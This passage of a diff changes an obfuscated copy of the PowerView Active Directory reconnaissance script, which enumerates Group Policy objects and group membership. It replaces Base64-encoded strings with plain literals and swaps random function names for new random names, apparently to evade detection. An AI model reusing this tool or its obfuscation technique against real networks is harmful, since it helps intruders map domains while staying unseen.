-                        $GroupSID = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ2")))
+                    elseif ($Groupname -match 'Guests') {
+                        $GroupSID = 'S-1-5-32-546'
                     }
                     else {
-                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-                            $GroupSID = sgnhjq -ObjectName $Groupname -Credential $Credential
+                        if ($PSBoundParameters['Credential']) {
+                            $GroupSID = qszqvr -ObjectName $Groupname -Credential $Credential
                         }
                         else {
-                            $GroupSID = sgnhjq -ObjectName $Groupname
+                            $GroupSID = qszqvr -ObjectName $Groupname
                         }
                     }
                 }
 
                 
-                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURE"))) } | ForEach-Object {
+                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                     if ($_.sid) { $_.sid }
                     else { $_.name }
                 }
@@ -7598,7 +7602,7 @@ function oahmtk {
                     
                     if ($_.filters) {
                         $Filters = $_.filters.GetEnumerator() | ForEach-Object {
-                            New-Object -TypeName PSObject -Property @{([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHlwZQ=="))) = $_.LocalName;([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmFsdWU="))) = $_.name}
+                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                         }
                     }
                     else {
@@ -7608,30 +7612,30 @@ function oahmtk {
                     if ($Members -isnot [System.Array]) { $Members = @($Members) }
 
                     $GroupsXML = New-Object PSObject
-                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPUGF0aA=="))) $TargetGroupsXMLPath
-                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsdGVycw=="))) $Filters
-                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
-                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBTSUQ="))) $GroupSID
-                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBNZW1iZXJPZg=="))) $Null
-                    $GroupsXML | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBNZW1iZXJz"))) $Members
-                    $GroupsXML.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lkdyb3Vwc1hNTA=="))))
+                    $GroupsXML | Add-Member Noteproperty 'GPOPath' $TargetGroupsXMLPath
+                    $GroupsXML | Add-Member Noteproperty 'Filters' $Filters
+                    $GroupsXML | Add-Member Noteproperty 'GroupName' $GroupName
+                    $GroupsXML | Add-Member Noteproperty 'GroupSID' $GroupSID
+                    $GroupsXML | Add-Member Noteproperty 'GroupMemberOf' $Null
+                    $GroupsXML | Add-Member Noteproperty 'GroupMembers' $Members
+                    $GroupsXML.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                     $GroupsXML
                 }
             }
         }
         catch {
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Hcm91cHNYTUxdIEVycm9yIHBhcnNpbmcgJFRhcmdldEdyb3Vwc1hNTFBhdGggOiB7MH0="))) -f $_)
+            Write-Verbose ("[Get-GroupsXML] Error parsing $TargetGroupsXMLPath : {0}" -f $_)
         }
     }
 
     END {
         
-        $MappedPaths.Keys | ForEach-Object { erbqbk -Path $_ }
+        $MappedPaths.Keys | ForEach-Object { oqraoh -Path $_ }
     }
 }
 
 
-function glraut {
+function xfvvfy {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -7682,7 +7686,7 @@ function glraut {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -7713,68 +7717,68 @@ function glraut {
 
     BEGIN {
         $SearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $GPOSearcher = ltdynu @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $GPOSearcher = vydvzz @SearcherArguments
     }
 
     PROCESS {
         if ($GPOSearcher) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJJZGVudGl0eQ==")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcklkZW50aXR5")))]) {
+            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                 $GPOAdsPaths = @()
-                if ($SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) {
-                    $OldProperties = $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]
+                if ($SearcherArguments['Properties']) {
+                    $OldProperties = $SearcherArguments['Properties']
                 }
-                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsZG5zaG9zdG5hbWU=")))
+                $SearcherArguments['Properties'] = 'distinguishedname,dnshostname'
                 $TargetComputerName = $Null
 
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJJZGVudGl0eQ==")))]) {
-                    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $ComputerIdentity
-                    $Computer = aglnim @SearcherArguments -FindOne | Select-Object -First 1
+                if ($PSBoundParameters['ComputerIdentity']) {
+                    $SearcherArguments['Identity'] = $ComputerIdentity
+                    $Computer = auxvef @SearcherArguments -FindOne | Select-Object -First 1
                     if(-not $Computer) {
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIENvbXB1dGVyICckQ29tcHV0ZXJJZGVudGl0eScgbm90IGZvdW5kIQ==")))
+                        Write-Verbose "[Get-DomainGPO] Computer '$ComputerIdentity' not found!"
                     }
                     $ObjectDN = $Computer.distinguishedname
                     $TargetComputerName = $Computer.dnshostname
                 }
                 else {
-                    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $UserIdentity
-                    $User = cqaorm @SearcherArguments -FindOne | Select-Object -First 1
+                    $SearcherArguments['Identity'] = $UserIdentity
+                    $User = ykrker @SearcherArguments -FindOne | Select-Object -First 1
                     if(-not $User) {
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIFVzZXIgJyRVc2VySWRlbnRpdHknIG5vdCBmb3VuZCE=")))
+                        Write-Verbose "[Get-DomainGPO] User '$UserIdentity' not found!"
                     }
                     $ObjectDN = $User.distinguishedname
                 }
 
                 
                 $ObjectOUs = @()
-                $ObjectOUs += $ObjectDN.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))) | ForEach-Object {
-                    if($_.startswith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T1U9"))))) {
-                        $ObjectDN.SubString($ObjectDN.IndexOf((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9LA=="))) -f $($_))))
+                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
+                    if($_.startswith('OU=')) {
+                        $ObjectDN.SubString($ObjectDN.IndexOf(("{0}," -f $($_))))
                     }
                 }
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIG9iamVjdCBPVXM6ICRPYmplY3RPVXM=")))
+                Write-Verbose "[Get-DomainGPO] object OUs: $ObjectOUs"
 
                 if ($ObjectOUs) {
                     
-                    $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))))
+                    $SearcherArguments.Remove('Properties')
                     $InheritanceDisabled = $False
                     ForEach($ObjectOU in $ObjectOUs) {
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $ObjectOU
-                        $GPOAdsPaths += tmesuk @SearcherArguments | ForEach-Object {
+                        $SearcherArguments['Identity'] = $ObjectOU
+                        $GPOAdsPaths += kpvdys @SearcherArguments | ForEach-Object {
                             
                             if ($_.gplink) {
-                                $_.gplink.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XVs=")))) | ForEach-Object {
-                                    if ($_.startswith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA=="))))) {
-                                        $Parts = $_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ow=="))))
+                                $_.gplink.split('][') | ForEach-Object {
+                                    if ($_.startswith('LDAP')) {
+                                        $Parts = $_.split(';')
                                         $GpoDN = $Parts[0]
                                         $Enforced = $Parts[1]
 
@@ -7803,15 +7807,15 @@ function glraut {
 
                 if ($TargetComputerName) {
                     
-                    $ComputerSite = (zzsifw -ComputerName $TargetComputerName).SiteName
-                    if($ComputerSite -and ($ComputerSite -notlike ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3Iq"))))) {
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $ComputerSite
-                        $GPOAdsPaths += aetbwl @SearcherArguments | ForEach-Object {
+                    $ComputerSite = (mspskz -ComputerName $TargetComputerName).SiteName
+                    if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
+                        $SearcherArguments['Identity'] = $ComputerSite
+                        $GPOAdsPaths += beqjfr @SearcherArguments | ForEach-Object {
                             if($_.gplink) {
                                 
-                                $_.gplink.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XVs=")))) | ForEach-Object {
-                                    if ($_.startswith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA=="))))) {
-                                        $_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ow=="))))[0]
+                                $_.gplink.split('][') | ForEach-Object {
+                                    if ($_.startswith('LDAP')) {
+                                        $_.split(';')[0]
                                     }
                                 }
                             }
@@ -7820,37 +7824,37 @@ function glraut {
                 }
 
                 
-                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9")))))
-                $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))))
-                $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))))
-                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGNsYXNzPWRvbWFpbikoZGlzdGluZ3Vpc2hlZG5hbWU9JE9iamVjdERvbWFpbkROKQ==")))
-                $GPOAdsPaths += kzvwpf @SearcherArguments | ForEach-Object {
+                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))
+                $SearcherArguments.Remove('Identity')
+                $SearcherArguments.Remove('Properties')
+                $SearcherArguments['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
+                $GPOAdsPaths += guawbd @SearcherArguments | ForEach-Object {
                     if($_.gplink) {
                         
-                        $_.gplink.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XVs=")))) | ForEach-Object {
-                            if ($_.startswith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUA=="))))) {
-                                $_.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Ow=="))))[0]
+                        $_.gplink.split('][') | ForEach-Object {
+                            if ($_.startswith('LDAP')) {
+                                $_.split(';')[0]
                             }
                         }
                     }
                 }
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIEdQT0Fkc1BhdGhzOiAkR1BPQWRzUGF0aHM=")))
+                Write-Verbose "[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths"
 
                 
-                if ($OldProperties) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $OldProperties }
-                else { $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))) }
-                $SearcherArguments.Remove(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))))
+                if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
+                else { $SearcherArguments.Remove('Properties') }
+                $SearcherArguments.Remove('Identity')
 
                 $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                     
-                    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $_
-                    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENhdGVnb3J5PWdyb3VwUG9saWN5Q29udGFpbmVyKQ==")))
-                    kzvwpf @SearcherArguments | ForEach-Object {
-                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
-                            $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQTy5SYXc="))))
+                    $SearcherArguments['SearchBase'] = $_
+                    $SearcherArguments['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
+                    guawbd @SearcherArguments | ForEach-Object {
+                        if ($PSBoundParameters['Raw']) {
+                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                         }
                         else {
-                            $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQTw=="))))
+                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                         }
                         $_
                     }
@@ -7860,78 +7864,78 @@ function glraut {
                 $IdentityFilter = ''
                 $Filter = ''
                 $Identity | Where-Object {$_} | ForEach-Object {
-                    $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
-                    if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUDovL3xeQ049Lio=")))) {
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
-                        if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
+                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                    if ($IdentityInstance -match 'LDAP://|^CN=.*') {
+                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                             
                             
-                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2U=")))
-                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
-                            $GPOSearcher = ltdynu @SearcherArguments
+                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                            Write-Verbose "[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                            $SearcherArguments['Domain'] = $IdentityDomain
+                            $GPOSearcher = vydvzz @SearcherArguments
                             if (-not $GPOSearcher) {
-                                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4=")))
+                                Write-Warning "[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'"
                             }
                         }
                     }
-                    elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ey4qfQ==")))) {
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG5hbWU9JElkZW50aXR5SW5zdGFuY2Up")))
+                    elseif ($IdentityInstance -match '{.*}') {
+                        $IdentityFilter += "(name=$IdentityInstance)"
                     }
                     else {
                         try {
-                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WA==")))).PadLeft(2,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MA=="))))})) -Replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KC4uKQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQx")))
-                            $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
+                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
+                            $IdentityFilter += "(objectguid=$GuidByteString)"
                         }
                         catch {
-                            $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3BsYXluYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
+                            $IdentityFilter += "(displayname=$IdentityInstance)"
                         }
                     }
                 }
                 if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
+                    $Filter += "(|$IdentityFilter)"
                 }
 
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVy")))
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
+                if ($PSBoundParameters['LDAPFilter']) {
+                    Write-Verbose "[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter"
+                    $Filter += "$LDAPFilter"
                 }
 
-                $GPOSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXBQb2xpY3lDb250YWluZXIpJEZpbHRlcik=")))
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIGZpbHRlciBzdHJpbmc6IHswfQ=="))) -f $($GPOSearcher.filter))
+                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
+                Write-Verbose ("[Get-DomainGPO] filter string: {0}" -f $($GPOSearcher.filter))
 
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $GPOSearcher.FindOne() }
+                if ($PSBoundParameters['FindOne']) { $Results = $GPOSearcher.FindOne() }
                 else { $Results = $GPOSearcher.FindAll() }
                 $Results | Where-Object {$_} | ForEach-Object {
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
+                    if ($PSBoundParameters['Raw']) {
                         
                         $GPO = $_
-                        $GPO.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQTy5SYXc="))))
+                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                     }
                     else {
-                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] -and ($SearchBase -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkdDOi8v"))))) {
-                            $GPO = hfjsvm -Properties $_.Properties
+                        if ($PSBoundParameters['SearchBase'] -and ($SearchBase -Match '^GC://')) {
+                            $GPO = tsuvgg -Properties $_.Properties
                             try {
                                 $GPODN = $GPO.distinguishedname
-                                $GPODomain = $GPODN.SubString($GPODN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                                $gpcfilesyspath = (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFwkR1BPRG9tYWluXFN5c1ZvbFwkR1BPRG9tYWluXFBvbGljaWVzXHswfQ=="))) -f $($GPO.cn))
-                                $GPO | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3BjZmlsZXN5c3BhdGg="))) $gpcfilesyspath
+                                $GPODomain = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                                $gpcfilesyspath = ("\\$GPODomain\SysVol\$GPODomain\Policies\{0}" -f $($GPO.cn))
+                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath
                             }
                             catch {
-                                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIEVycm9yIGNhbGN1bGF0aW5nIGdwY2ZpbGVzeXNwYXRoIGZvcjogezB9"))) -f $($GPO.distinguishedname))
+                                Write-Verbose ("[Get-DomainGPO] Error calculating gpcfilesyspath for: {0}" -f $($GPO.distinguishedname))
                             }
                         }
                         else {
-                            $GPO = hfjsvm -Properties $_.Properties
+                            $GPO = tsuvgg -Properties $_.Properties
                         }
-                        $GPO.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkdQTw=="))))
+                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                     }
                     $GPO
                 }
                 if ($Results) {
                     try { $Results.dispose() }
                     catch {
-                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HUE9dIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6IHswfQ=="))) -f $_)
+                        Write-Verbose ("[Get-DomainGPO] Error disposing of the Results object: {0}" -f $_)
                     }
                 }
                 $GPOSearcher.dispose()
@@ -7941,7 +7945,7 @@ function glraut {
 }
 
 
-function jkijxe {
+function spsthe {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -7977,7 +7981,7 @@ function jkijxe {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -7997,56 +8001,56 @@ function jkijxe {
 
     BEGIN {
         $SearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
